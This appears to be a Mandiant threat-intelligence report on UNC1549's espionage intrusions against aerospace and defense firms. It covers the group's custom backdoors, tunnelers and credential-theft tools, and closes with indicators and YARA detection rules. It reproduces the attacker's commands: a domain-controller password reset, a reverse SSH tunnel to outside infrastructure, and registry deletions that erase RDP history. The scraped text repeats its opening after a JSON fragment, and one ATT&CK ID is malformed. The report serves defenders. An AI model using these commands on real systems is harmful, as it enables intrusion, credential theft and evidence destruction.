UNC1549 a path of lesser resistance, allowing them to circumvent the primary target's main security controls by first compromising a connected entity. Operating in late 2023 through 2025, UNC1549 employed sophisticated initial access vectors, including abuse of third-party relationships to gain entry (pivoting from service providers to their customers), VDI breakouts from third parties, and highly targeted, role-relevant phishing. Once inside, the group leverages creative lateral movement techniques, such as stealing victim source code for spear-phishing campaigns that use lookalike domains to bypass proxies, and abusing internal service ticketing systems for credential access. They employ custom tooling, notably DCSYNCER.SLICK\u2014a variant deployed via search order hijacking to conduct DCSync attacks. UNC1549\u2019s campaign is distinguished by its focus on anticipating investigators and ensuring long-term persistence after detection. They plant backdoors that beacon silently for months, only activating them to regain access after the victim has attempted eradication. They maintain stealth and command and control (C2) using extensive reverse SSH shells (which limit forensic evidence) and domains strategically mimicking the victim's industry. Threat Activity Initial Compromise A primary initial access vector employed by UNC1549 involved combining targeted social engineering with the exploitation of compromised third-party accounts. Leveraging credentials harvested from vendors, partners, or other trusted external entities, UNC1549 exploited legitimate access pathways inherent in these relationships. Third-Party Services Notably, the group frequently abused Citrix, VMWare, and Azure Virtual Desktop and Application services provided by victim organizations to third party partners, collaborators, and contractors. Utilizing compromised third-party credentials, they authenticated to the supplier\u2019s infrastructure, establishing an initial foothold within the network perimeter. Post-authentication, UNC1549 used techniques designed to escape the security boundaries and restrictions of the virtualized Citrix session. This breakout granted them access to the underlying host system or adjacent network segments, and enabled the initiation of lateral movement activities deeper within the target corporate network. Spear Phishing UNC1549 utilized targeted spear-phishing emails as one of the methods to gain initial network access. These emails used lures related to job opportunities or recruitment efforts, aiming to trick recipients into downloading and running malware hidden in attachments or links. Figure 1 shows a sample phishing email sent to one of the victims. Figure 1: Screenshot of a phishing email sent by UNC1549 Following a successful breach, Mandiant observed UNC1549 pivoting to spear-phishing campaigns specifically targeting IT staff and administrators. The goal of this campaign was to obtain credentials with higher permissions. To make these phishing attempts more believable, the attackers often perform reconnaissance first, such as reviewing older emails in already compromised inboxes for legitimate password reset requests or identifying the company's internal password reset webpages, then crafted their malicious emails to mimic these authentic processes. Establish Foothold To maintain persistence within compromised networks, UNC1549 deployed several custom backdoors. Beyond MINIBIKE, which Mandiant discussed in the February 2024 blog post, the group also utilizes other custom malware such as TWOSTROKE and DEEPROOT. Significantly, Mandiant's analysis revealed that while the malware used for initial targeting and compromises was not unique, every post-exploitation payload identified, regardless of family, had a unique hash. This included instances where multiple samples of the same backdoor variant were found within the same victim network. This approach highlights UNC1549's sophistication and the considerable effort invested in customizing their tools to evade detection and complicate forensic investigations. Search Order Hijacking UNC1549 abused DLL search order hijacking to execute CRASHPAD, DCSYNCER.SLICK, GHOSTLINE, LIGHTRAIL, MINIBIKE, POLLBLEND, SIGHTGRAB, and TWOSTROKE payloads. Using the DLL search order hijacking techniques, UNC1549 achieved a persistent and stealthy way of executing their tooling. Throughout the different investigations, UNC1549 demonstrated a comprehensive understanding of software dependencies by exploiting DLL search order hijacking in multiple software solutions. UNC1549 has deployed malicious binaries targeting legitimate Fortigate, VMWare, Citrix, Microsoft, and NVIDIA executables. In many cases, the threat actor installed the legitimate software after initial access in order to abuse SOH; however, in other cases, the attacker leveraged software that was already installed on victim systems and then replaced or added the malicious DLLs within the legitimate installation directory, typically with SYSTEM privileges. TWOSTROKE TWOSTROKE, a C++ backdoor, utilizes SSL-encrypted TCP/443 connections to communicate with its controllers. This malware possesses a diverse command set, allowing for system information collection, DLL loading, file manipulation, and persistence. While showing some similarities to MINIBIKE, it's considered a unique backdoor. Upon execution of TWOSTROKE, it employs a specific routine to generate a unique victim identifier. TWOSTRIKE retrieves the fully qualified DNS computer name using the Windows API function GetComputerNameExW(ComputerNameDnsFullyQualified) . This retrieved name then undergoes an XOR encryption process, utilizing the static key. Following the encryption, the resulting binary data is converted into a lowercase hexadecimal string. Finally, TWOSTROKE extracts the first eight characters of this hexadecimal string, reverses it, and uses it as the victim's unique bot ID for later communication with the C2 server. Functionalities After sending the check in request to the C2 server, the TWOSTROKE C2 server returns with a hex-encoded payload that contains multiple values separated by \" @##@ .\" Depending on the received command, TWOSTROKE can execute one of the following commands: 1 : Upload a file to the C2 2 : Execute a file or a shell command 3 : DLL execution into memory 4 : Download file from the C2 5 : Get the full victim user name 6 : Get the full victim machine name 7 : List a directory 8 : Delete a file LIGHTRAIL UNC1549 was observed downloading a ZIP file from attacker-owned infrastructure. This ZIP file contained the LIGHTRAIL tunneler as VGAuth.dll and was executed through search order hijacking using the VGAuthCLI.exe executable. LIGHTRAIL is a custom tunneler, likely based on the open-source Socks4a proxy, Lastenzug , that communicates using Azure cloud infrastructure. There are several distinct differences between the LIGHTRAIL sample and the LastenZug source code. These include: Increasing the MAX_CONNECTIONS from 250 to 5000 Static configuration inside the lastenzug function ( wPath and port ) No support for using a proxy server when connecting to the WebSocket C2 Compiler optimizations reducing the number of functions (26 to 10) Additionally, LastenZug is using hashing for DLLs and API function resolving. By default, the hash value is XOR\u2019d with the value 0x41507712 , while the XOR value in the observed LIGHTRAIL sample differs from the original source code - 0x41424344 ( \u2018ABCD\u2019 ) . After loading the necessary API function pointers, the initialization continues by populating the server name ( wServerName ), the port, and URI ( wPath ) values. The port is hardcoded at 443 (for HTTPS) and the path is hardcoded to \" /news .\" This differs from the source code where these values are input parameters to the lastenzug function. The initWS function is responsible for establishing the WebSocket connection, which it does using the Windows WinHTTP API. The initWS function has a hard-coded User-Agent string which it constructs as a stack string: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136 Mandiant identified another LIGHTRAIL sample uploaded to VirusTotal from Germany. However, this sample seems to have been modified by the uploader as the C2 domain was intentionally altered. GET https://aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com/page HTTP/1.1 Host: aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com Connection: Upgrade Upgrade: websocket User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136 Sec-WebSocket-Key: 9MeEoJ3sjbWAEed52LdRdg== Sec-WebSocket-Version: 13 Figure 2: Modified LIGHTRAIL network communication snippet Most notable is that this sample is using a different URL path for its communication, but also the User-Agent in this sample is different from the one that was observed in previous LIGHTRAIL samples and the LastenZug source code. DEEPROOT DEEPROOT is a Linux backdoor written in Golang and supports the following functionalities: shell command execution, system information enumeration and file listing, delete, upload, and download. DEEPROOT was compiled to be operating on Linux systems; however, due to Golang\u2019s architecture DEEPROOT could also be compiled for other operating systems. At the time of writing, Mandiant has not observed any DEEPROOT samples targeting Windows systems. DEEPROOT was observed using multiple C2 domains hosted in Microsoft Azure. The observed DEEPROOT samples used multiple C2 servers per binary, suspected to be used for redundancy in case one C2 server has been taken down. Functionalities After sending the check in request to the C2 server, the DEEPROOT C2 server returns with a hex-encoded payload that contains multiple values separated by \u2018 -===- \u2019 <sleep_timeout>-===-<command_id>-===-<command>-===-<argument_1>-===-<argument_2> Figure 3: Decoded POST body data structure sleep_timeout is the time in milli-seconds to wait before making the next request. command_id is an identifier for the C2 command, used by the backdoor when responding to the C2 with the result. command is the command number and it's one of the following: 1 - Get directory information (directory listing), the directory path is received in argument_1 . 2 - Delete a file, the file path is received in argument_1 . 3 - Get the victim username. 4 - Get the victim's hostname. 5 - Execute a shell command, the shell command is received in argument_1 . 6 - Download a file from the C2, the C2 file path is received in argument_1 and the local file path is received in argument_2 . 7 - Upload a file to the C2, the local file path is received in argument_1 . argument_1 and argument_2 are the command arguments and it is optional. GHOSTLINE GHOSTLINE is a Windows tunneler utility written in Golang that uses a hard-coded domain for its communication. GHOSTLINE uses the go-yamux library for its network connection. POLLBLEND POLLBLEND is a Windows tunneler that is written in C++. Earlier iterations of POLLBLEND featured multiple hardcoded C2 servers and utilized two hardcoded URI parameters for self-registration and tunneler configuration download. For the registration of the machine, POLLBLEND would reach out to /register/ and sent a HTTP POST request with the following JSON body. {\"username\": \"<computer_name>\"} Figure 4: POLLBLEND body data Code Signing Throughout the tracking of UNC1549\u2019s activity across multiple intrusions, the Iranian-backed threat group was observed signing some of their backdoor binaries with legitimate code-signing certificates\u2014a tactic also covered by Check Point \u2014likely to help their malware evade detection and bypass security controls like application allowlists, which are often configured to trust digitally signed code. The group employed this technique to weaponize malware samples, including variants for GHOSTLINE, POLLBLEND, and TWOSTROKE. All identified code-signing certificates have been reported to the relevant issuing Certificate Authorities for revocation. Escalate Privileges UNC1549 has been observed using a variety of techniques and custom tools aimed at stealing credentials and gathering sensitive data post-compromise. This included a utility, tracked as DCSYNCER.SLICK, designed to mimic the DCSync Active Directory replication feature. DCSync is a legitimate function domain controllers use for replicating changes via RPC . This allowed the attackers to extract NTLM password hashes directly from the domain controllers. Another tool, dubbed CRASHPAD, focused on extracting credentials saved within web browsers. For visual data collection, they deployed SIGHTGRAB, a tool capable of taking periodic screenshots, potentially capturing sensitive information displayed on the user's screen. Additionally, UNC1549 utilized simpler methods, such as deploying TRUSTTRAP, which presented fake popup windows prompting users to enter their credentials, which were then harvested by the attackers. UNC1549 frequently used DCSync attacks to obtain NTLM password hashes for domain users, which they then cracked in order to facilitate lateral movement and privilege escalation. To gain the necessary directory replication rights for DCSync, the threat actor employed several methods. They were observed unconventionally resetting passwords for domain controller computer accounts using net.exe . This action typically broke the domain controller functionality of the host and caused an outage, yet it successfully enabled them to perform the DCSync operation and extract sensitive credentials, including those for domain administrators and Azure AD Connect accounts. UNC1549 leveraged other techniques to gain domain replication rights, including creating rogue computer accounts and abusing Resource-Based Constrained Delegation (RBCD) assignments. They also performed Kerberoasting, utilizing obfuscated Invoke-Kerberoast scripts, for credential theft. net user DC-01$ P@ssw0rd Figure 5: Example of an UNC1549 net.exe command to reset a domain controller computer account In some cases, shortly after gaining a foothold on workstations, UNC1549 discovered vulnerable Active Directory Certificate Services templates. They used these to request certificates, allowing them to impersonate higher-privileged user accounts. UNC1549 also frequently targeted saved credentials within web browsers, either through malicious utilities or by RDP session hijacking. In the latter, the threat actor would identify which user was logged onto a system through quser.exe or wmic.exe, and then RDP to that system with the user's account to gain access to their active and unlocked web browser sessions. DCSYNCER.SLICK DCSYNCER.SLICK is a Windows executable that is based on the Open source Project DCSyncer and is based on Mimikatz source code. DCSYNCER.SLICK has been modified to use Dynamic API resolution and has all its printf statements removed. Additionally, DCSYNCER.SLICK collects and XOR-encrypts the credentials before writing them to a hardcoded filename and path. The following hardcoded filenames and paths were observed being used by DCSYNCER.SLICK: C:\\users\\public\\LOG.txt C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\LOG.txt To evade detection, UNC1549 executed the malware within the context of a compromised domain controller computer account. They achieved this compromise by manually resetting the account password. Instead of utilizing the standard netdom command, UNC1549 used the Windows command net user <computer_name> <password> . Subsequently, they used these newly acquired credentials to execute the DCSYNCER.SLICK payload. This tactic would give the false impression that replication had occurred between two legitimate domain controllers. CRASHPAD CRASHPAD is a Windows executable that is written in C++ that decrypts the content of the file config.txt into the file crash.log by impersonating the explorer.exe user privilege and through the CryptUnprotectData API . C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\crash.log C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\config.txt The contents of these files could not be determined because UNC1549 deleted the output after CRASHPAD was executed. The CRASHPAD configuration and output file paths were hardcoded into the sample, similar to the LOG.txt filename found in the DCSYNCER.SLICK binary. SIGHTGRAB SIGHTGRAB is a Windows executable written in C that autonomously captures screen shots at regular intervals and saves them to disk. Upon execution SIGHTGRAB loads several Windows libraries dynamically at runtime including User32.dll , Gdi32.dll , and Ole32.dll . SIGHTGRAB implements runtime API resolution through LoadLibraryA and GetProcAddress calls with encoded strings to access system functions. SIGHTGRAB uses XOR encryption with a single-byte key of 0x41 to decode API function names. SIGHTGRAB retrieves the current timestamp and uses string interpolation of YYYY-MM-DD-HH-MM on the timestamp to generate the directory name. In this newly created directory, SIGHTGRAB saves all the taken screenshots incrementally. C:\\Users\\Public\\Videos\\2025-3-7-10-17\\1.jpg C:\\Users\\Public\\Videos\\2025-3-7-10-17\\2.jpg C:\\Users\\Public\\Videos\\2025-3-7-10-17\\3.jpg C:\\Users\\Public\\Music\\2025-3-7-10-17\\1.jpg C:\\Users\\Public\\Music\\2025-3-7-10-17\\2.jpg C:\\Users\\Public\\Music\\2025-3-7-10-17\\3.jpg Figure 6: Examples of screenshot files created by SIGHTGRAB on disk Mandiant observed UNC1549 strategically deploy SIGHTGRAB on workstations to target users in two categories: those handling sensitive data, allowing for subsequent data exposure and exfiltration, and those with privileged access, enabling privilege escalation and access to restricted systems. TRUSTTRAP A malware that serves a Windows prompt to trick the user into submitting their credentials. The captured credentials are saved in cleartext to a file. Figure 7 shows a sample popup by TRUSTTRAP mimicking the Microsoft Outlook login window. Figure 7: Screenshot showing the fake Microsoft Outlook login window TRUSTTRAP has been used by UNC1549 since at least 2023 for obtaining user credentials used for lateral movement. Reconnaissance and Lateral Movement For internal reconnaissance, UNC1549 leveraged legitimate tools and publicly available utilities, likely to blend in with standard administrative activities. AD Explorer , a valid executable signed by Microsoft, was used to query Active Directory and inspect its configuration details. Alongside this, the group employed native Windows commands like net user and net group to enumerate specific user accounts and group memberships within the domain, and PowerShell scripts for ping and port scanning reconnaissance on specific subnets, typically those associated with privileged servers or IT administrator workstations UNC1549 uses a wide variety of methods for lateral movement, depending on restrictions within the victim environment. Most frequently, RDP was used. Mandiant also observed the use of PowerShell Remoting, Atelier Web Remote Commander (\u201cAWRC\u201d), and SCCM remote control, including execution of variants of SCCMVNC to enable SCCM remote control on systems. Atelier Web Remote Commander Atelier Web Remote Commander (AWRC) is a commercial utility for remotely managing, auditing, and supporting Windows systems. Its key distinction is its agentless design, meaning it requires no software installation or pre-configuration on the remote machine, enabling administrators to connect immediately. Leveraging the capabilities of AWRC, UNC1549 utilized this publicly available commercial tool to facilitate post-compromise activities. These activities included: Established remote connections: Used AWRC to connect remotely to targeted hosts within the compromised network Conducted reconnaissance: Employed AWRC's built-in functions to gather information by: Enumerating running services Enumerating active processes Enumerating existing RDP sessions Stole credentials: Exploited AWRC to exfiltrate sensitive browser files known to contain stored user credentials from remote systems Deployed malware: Used AWRC as a vector to transfer and deploy malware onto compromised machines SCCMVNC SCCMVNC is a tool designed to leverage the existing Remote Control feature within Microsoft System Center Configuration Manager (SCCM/ConfigMgr) to achieve a VNC-like remote access experience without requiring additional third-party modules or user consent/notifications. SCCM.exe reconfig /target:[REDACTED] Figure 8: Example of an UNC1549 executing SCCMVNC command The core functionality of SCCMVNC lies in its ability to manipulate the existing Remote Control feature of SCCM. Instead of deploying a separate VNC server or other remote access software, the tool directly interacts with and reconfigures the settings of the native SCCM Remote Control service on a client workstation. This approach leverages an already present and trusted component within the enterprise environment. A key aspect of SCCMVNC is its capacity to bypass the standard consent and notification mechanisms typically associated with SCCM Remote Control. Normally, when an SCCM remote control session is initiated, the end-user is prompted for permission, and various notification icons or connection bars are displayed. SCCMVNC effectively reconfigures the underlying SCCM settings (primarily through WMI interactions) to disable these user-facing requirements. This alteration allows for a significantly more discreet and seamless remote access experience, akin to what one might expect from a VNC connection where the user might not be immediately aware of the ongoing session. Command and Control UNC1549 continued to use Microsoft Azure Web Apps registrations and cloud infrastructure for C2. In addition to backdoors including MINIBUS, MINIBIKE, and TWOSTROKE, UNC1549 relied heavily on SSH reverse tunnels established on compromised systems to forward traffic from their C2 servers to compromised systems. This technique limited the availability of host-based artifacts during investigations, since security telemetry would only record network connections. For example, during data collection from SMB shares, outbound connections were observed from the SSH processes to port 445 on remote systems, but the actual data collected could not be confirmed due to no staging taking place within the victim environment, and object auditing being disabled. C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070 Figure 9: Example of an UNC1549 reverse SSH comman d Mandiant also identified evidence of UNC1549 deploying a variety of redundant remote access methods, including ZEROTIER and NGROK. In some instances, these alternative methods weren't used by the threat actor until victim organizations had performed remediation actions, suggesting they are primarily deployed to retain access. Complete Mission Espionage UNC1549's operations appear strongly motivated by espionage, with mission objectives centering around extensive data collection from targeted networks. The group actively seeks sensitive information, including network/IT documentation, intellectual property, and emails. Furthermore, UNC1549 often leverages compromised organizations as a pivot point, using their access to target other entities, particularly those within the same industry sector, effectively conducting third-party supplier and partner intrusions to further their intelligence-gathering goals. Notably, Mandiant responded to one intrusion at an organization in an unrelated sector, and assessed that the intrusion was opportunistic due to the initial spear phishing lure being related to a job at an aerospace and defense organization. This demonstrated UNC1549\u2019s ability to commit resources to expanding access and persistence in victim organizations that don\u2019t immediately meet traditional espionage goals. Defense Evasion UNC1549 frequently deleted utilities from compromised systems after execution to avoid detection and hinder investigation efforts. The deletion of forensic artifacts, including RDP connection history registry keys, was also observed. Additionally, as described earlier, the group repeatedly used SSH reverse tunnels from victim hosts back to their infrastructure, a technique which helped hide their activity from EDR agents installed on those systems. Combined, this activity demonstrated an increase in the operational security of UNC1549 over the past year. reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f Figure 10: Examples of UNC1549 commands to delete RDP connection history registry keys Acknowledgement This analysis would not have been possible without the assistance from across Google Threat Intelligence Group, Mandiant Consulting and FLARE. We would like to specifically thank Greg Sinclair and Mustafa Nasser from FLARE, and Melissa Derr, Liam Smith, Chris Eastwood, Alex Pietz, Ross Inman, and Emeka Agu from Mandiant Consulting. MITRE ATT&CK TACTIC ID Name Description Collection T1213.002 Data from Information Repositories: SharePoint UNC1549 browsed Microsoft Teams and SharePoint to download files used for extortion. Collection T1113 Screen Capture UNC1549 was observed making screenshots from sensitive data. Reconnaissance T16561598.003 Phishing for Information UNC1549 used third party vendor accounts to obtain privileged accounts using a Password Reset portal theme. Credential Access T1110.003 Brute Force: Password Spraying UNC1549 was observed performing password spray attacks against the Domain. Credential Access T1003.006 OS Credential Dumping: DCSync UNC1549 was observed using DCSYNCER.SLICK to perform DCSync on domain controller level. Defense Evasion T1574.001 Hijack Execution Flow: DLL Search Order Hijacking UNC1549 was observed using Search Order Hijacking to execute both LIGHTRAIL and DCSYNCER.SLICK. Initial Access T1078 Valid Accounts UNC1549 used valid compromised accounts to gain initial access Initial Access T1199 Trusted Relationship UNC1549 used trusted third party vendor accounts for both initial access and lateral movement. Indicators of Compromise (IOCs) The following IOCs are available in a GTI Collection for registered users. Type Indicator Description network 104.194.215[.]88 Observed being used for SSH tunneling network 13.60.50[.]172 Observed being used for SSH tunneling network 167.172.137[.]208 Observed being used for SSH tunneling network 34.18.42[.]26 Observed being used for SSH tunneling network 4.188.75[.]206 Observed being used for SSH tunneling network 4.240.113[.]27 Observed being used for SSH tunneling network 40.119.176[.]233 Observed being used for SSH tunneling network politicalanorak[.]com Observed being used for SSH tunneling network ac-connection-status105.azurewebsites[.]net GHOSTLINE network acc-cloud-connection.azurewebsites[.]net GHOSTLINE network active-az-check-status45.azurewebsites[.]net POLLBLEND network active-az-check-status675.azurewebsites[.]net POLLBLEND network active-az-status45.azurewebsites[.]net POLLBLEND network active-az-status795.azurewebsites[.]net POLLBLEND network active-internal-log65.azurewebsites[.]net POLLBLEND network active-internal-logs.azurewebsites[.]net POLLBLEND network active-intranet-logs.azurewebsites[.]net POLLBLEND network airbus.usa-careers[.]com Phishing domain for initial access network airlinecontrolsite.uaenorth.cloudapp.azure[.]com DEEPROOT network airlinecontrolsite.westus3.cloudapp.azure[.]com DEEPROOT network airplaneserviceticketings[.]com MINIBIKE network airseatregister.eastus.cloudapp.azure[.]com DEEPROOT network airseatsregister.qatarcentral.cloudapp.azure[.]com DEEPROOT network airseatsregistering.qatarcentral.cloudapp.azure[.]com DEEPROOT network airtravellog[.]com TWOSTROKE network automationagencybusiness.azurewebsites[.]net TWOSTROKE network automationagencybusiness[.]com TWOSTROKE network browsercheckap.azurewebsites[.]net MINIBIKE network codesparkle.eastus.cloudapp.azure[.]com TWOSTROKE network connect-acc-492.azurewebsites[.]net POLLBLEND network connect-acl-492.azurewebsites[.]net POLLBLEND network customerlistchange.eastus.cloudapp.azure[.]com LIGHTRAIL network developercodepro.azurewebsites[.]net TWOSTROKE network developercodevista.azurewebsites[.]net TWOSTROKE network dreamtiniventures.azurewebsites[.]net TWOSTROKE network fdtsprobusinesssolutions.azurewebsites[.]net TWOSTROKE network fdtsprobusinesssolutions[.]com TWOSTROKE network fdtsprobusinesssolutions.eastus.cloudapp.azure[.]com TWOSTROKE network fdtsprobusinesssolutions.northeurope.cloudapp.azure[.]com TWOSTROKE network forcecodestore[.]com TWOSTROKE network hserbhh43.westus3.cloudapp.azure[.]com Observed being used for SSH tunneling network infrasync-ac372.azurewebsites[.]net POLLBLEND network intra-az-check-status45.azurewebsites[.]net POLLBLEND network intra-az-check-status675.azurewebsites[.]net POLLBLEND network intra-az-status45.azurewebsites[.]net POLLBLEND network intra-az-status795.azurewebsites[.]net POLLBLEND network masterflexiblecloud.azurewebsites[.]net TWOSTROKE network mso-internal-log65.azurewebsites[.]net POLLBLEND network mso-internal-logs.azurewebsites[.]net POLLBLEND network mso-intranet-logs.azurewebsites[.]net POLLBLEND network mydocs.qatarcentral.cloudapp.azure[.]com Phishing domain for lateral movement network nx425-win4945.azurewebsites[.]net POLLBLEND network nx4542-win4957.azurewebsites[.]net POLLBLEND network nxlog-crash-1567.azurewebsites[.]net POLLBLEND network nxlog-win-1567.azurewebsites[.]net POLLBLEND network nxversion-win-1567.azurewebsites[.]net POLLBLEND network nxversion-win32-1127.azurewebsites[.]net POLLBLEND network overqatfa.northeurope.cloudapp.azure[.]com Observed being used for SSH tunneling network queuetestapplication.azurewebsites[.]net MINIBIKE network skychain13424.azurewebsites[.]net MINIBIKE network skychain41334.northeurope.cloudapp.azure[.]com MINIBIKE network skychains42745.eastus.cloudapp.azure[.]com MINIBIKE network skyticketgrant.azurewebsites[.]net MINIBIKE network snare-core.azurewebsites[.]net POLLBLEND network storageboxcloud.northeurope.cloudapp.azure[.]com TWOSTROKE network storagewiz.co.azurewebsites[.]net TWOSTROKE network swiftcode.eastus.cloudapp.azure[.]com TWOSTROKE network swifttiniventures.azurewebsites[.]net TWOSTROKE network terratechworld.eastus.cloudapp.azure[.]com TWOSTROKE network thecloudappbox.azurewebsites[.]net TWOSTROKE network thestorageboxcloud.northeurope.cloudapp.azure[.]com TWOSTROKE network thetacticstore[.]com TWOSTROKE network thevaultapp.westus3.cloudapp.azure[.]com TWOSTROKE network thevaultspace.eastus.cloudapp.azure[.]com TWOSTROKE network tini-ventures[.]com TWOSTROKE network vcphone-ms.azurewebsites[.]net POLLBLEND network vcs-news[.]com Observed being used for SSH tunneling network vm-ticket-svc.azurewebsites[.]net POLLBLEND network vm-tools-svc.azurewebsites[.]net POLLBLEND network vmware-health-ms.azurewebsites[.]net POLLBLEND YARA Rules import \"pe\" rule M_APT_Utility_DCSYNCER_SLICK_1 { meta: author = \"Google Threat Intelligence Group (GTIG)\" md5 = \"10f16991665df69d1ccd5187e027cf3d\" strings: $ = { 48 89 84 24 ?? 01 00 00 C7 84 24 ?? 01 00 00 30 80 28 00 C7 84 24 ?? 01 00 00 E8 03 00 00 48 C7 84 24 ?? 01 00 00 00 00 A0 00 BA ?? 00 00 00 8D 4A ?? FF 15 ?? ?? 01 00 48 89 84 24 ?? 01 00 00 C7 00 01 00 00 00 48 8B 84 24 ?? 01 00 00 44 89 ?? 04 48 8B 84 24 ?? 01 00 00 C7 40 08 ?? 00 00 00 41 8B ?? } $ = \"\\\\LOG.txt\" ascii wide $ = \"%ws_%d:%d:\" ascii wide fullword $ = \"%ws:%d:\" ascii wide fullword $ = \"::::\" ascii wide fullword $ = \"%ws_%d:%d::\" ascii wide fullword $ = \"%ws:%d::\" ascii wide fullword condition: pe.is_pe and all of them } import \"pe\" rule M_APT_Utility_CRASHPAD_1 { meta: author = \"Google Threat Intelligence Group (GTIG)\" md5 = \"b2bd275f97cb95c7399065b57f90bb6c\" strings: $ = \"[-] Loo ror: %u\" ascii fullword $ = \"[-] Adj r: %u\" ascii fullword $ = \"[-] Th ge. \" ascii fullword $ = \"[+] O s!\" ascii fullword $ = \"[-] O C: %i\" ascii fullword $ = \"[-] O E: %i\" ascii fullword $ = \"[+] Op cess!\" ascii fullword $ = \"[-] Op Code: %i\" ascii fullword $ = \"[-] O Error: %i\" ascii fullword $ = \"[+] Im su!\" ascii fullword $ = \"[+] R\" ascii fullword $ = \"[-] Impe Code: %i\" ascii fullword $ = \"[-] Imo: %i\" ascii fullword $ = \"[+] Du success!\" ascii fullword $ = \"[-] Du Code: %i\" ascii fullword $ = \"[-] Du Error: %i\" ascii fullword $ = \"[+] Dec Suc.\" ascii fullword $ = \"%02X\" ascii fullword $ = \"Decryption failed\" ascii fullword $ = \"config.txt\" $ = \"crash.log\" $ = \"[+] e wt!\" ascii fullword $ = \"[+] p %d!\" ascii fullword $ = \"[+] e!\" ascii fullword condition: pe.is_pe and 15 of them } Google Security Operations Detections Google SecOps customers receive robust detection for UNC1549 TTPs through curated threat intelligence from Mandiant and Google Threat Intelligence. This frontline intelligence is operationalized within the platform as custom detection signatures and advanced YARA-L rules. Posted in Threat Intelligence Related articles Threat Intelligence GTIG AI Threat Tracker: Distillation, Experimentation, and (Continued) Integration of AI for Adversarial Use By Google Threat Intelligence Group \u2022 33-minute read Threat Intelligence Beyond the Battlefield: Threats to the Defense Industrial Base By Google Threat Intelligence Group \u2022 28-minute read Threat Intelligence UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering By Mandiant \u2022 26-minute read Threat Intelligence Vishing for Access: Tracking the Expansion of ShinyHunters-Branded SaaS Data Theft By Mandiant \u2022 15-minute read Footer Links Follow us Google Cloud Google Cloud Products Privacy Terms Cookies management controls Help Language \u202aEnglish\u202c \u202aDeutsch\u202c \u202aFran\u00e7ais\u202c \u202a\ud55c\uad6d\uc5b4\u202c \u202a\u65e5\u672c\u8a9e\u202c",
    "filtered_content": "Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem | Google Cloud Blog Jump to Content Cloud Blog Contact sales Get started for free Cloud Blog Solutions & technology AI & Machine Learning API Management Application Development Application Modernization Chrome Enterprise Compute Containers & Kubernetes Data Analytics Databases DevOps & SRE Maps & Geospatial Security Security & Identity Threat Intelligence Infrastructure Infrastructure Modernization Networking Productivity & Collaboration SAP on Google Cloud Storage & Data Transfer Sustainability Ecosystem IT Leaders Industries Financial Services Healthcare & Life Sciences Manufacturing Media & Entertainment Public Sector Retail Supply Chain Telecommunications Partners Startups & SMB Training & Certifications Inside Google Cloud Google Cloud Next & Events Google Cloud Consulting Google Maps Platform Google Workspace Developers & Practitioners Transform with Google Cloud Contact sales Get started for free Threat Intelligence Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem November 17, 2025 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Mohamed El-Banna, Daniel Lee, Mike Stokkel, Josh Goddard Overview Last year, Mandiant published a blog post highlighting suspected Iran-nexus espionage activity targeting the aerospace, aviation, and defense industries in the Middle East. In this follow-up post, Mandiant discusses additional tactics, techniques, and procedures (TTPs) observed in incidents Mandiant has responded to. Since mid-2024, Mandiant has responded to targeted campaigns by the threat group UNC1549 against the aerospace, aviation and defense industries. To gain initial access into these environments, UNC1549 employed a dual approach: deploying well-crafted phishing campaigns designed to steal credentials or deliver malware and exploiting trusted connections with third-party suppliers and partners. The latter technique is particularly strategic when targeting organizations with high security maturity, such as defense contractors. While these primary targets often invest heavily in robust defenses, their third-party partners may possess less stringent security postures. This disparity provides UNC1549 a path of lesser resistance, allowing them to circumvent the primary target's main security controls by first compromising a connected entity. Operating in late 2023 through 2025, UNC1549 employed sophisticated initial access vectors, including abuse of third-party relationships to gain entry (pivoting from service providers to their customers), VDI breakouts from third parties, and highly targeted, role-relevant phishing. Once inside, the group leverages creative lateral movement techniques, such as stealing victim source code for spear-phishing campaigns that use lookalike domains to bypass proxies, and abusing internal service ticketing systems for credential access. They employ custom tooling, notably DCSYNCER.SLICK\u2014a variant deployed via search order hijacking to conduct DCSync attacks. UNC1549\u2019s campaign is distinguished by its focus on anticipating investigators and ensuring long-term persistence after detection. They plant backdoors that beacon silently for months, only activating them to regain access after the victim has attempted eradication. They maintain stealth and command and control (C2) using extensive reverse SSH shells (which limit forensic evidence) and domains strategically mimicking the victim's industry. Threat Activity Initial Compromise A primary initial access vector employed by UNC1549 involved combining targeted social engineering with the exploitation of compromised third-party accounts. Leveraging credentials harvested from vendors, partners, or other trusted external entities, UNC1549 exploited legitimate access pathways inherent in these relationships. Third-Party Services Notably, the group frequently abused Citrix, VMWare, and Azure Virtual Desktop and Application services provided by victim organizations to third party partners, collaborators, and contractors. Utilizing compromised third-party credentials, they authenticated to the supplier\u2019s infrastructure, establishing an initial foothold within the network perimeter. Post-authentication, UNC1549 used techniques designed to escape the security boundaries and restrictions of the virtualized Citrix session. This breakout granted them access to the underlying host system or adjacent network segments, and enabled the initiation of lateral movement activities deeper within the target corporate network. Spear Phishing UNC1549 utilized targeted spear-phishing emails as one of the methods to gain initial network access. These emails used lures related to job opportunities or recruitment efforts, aiming to trick recipients into downloading and running malware hidden in attachments or links. Figure 1 shows a sample phishing email sent to one of the victims. Figure 1: Screenshot of a phishing email sent by UNC1549 Following a successful breach, Mandiant observed UNC1549 pivoting to spear-phishing campaigns specifically targeting IT staff and administrators. The goal of this campaign was to obtain 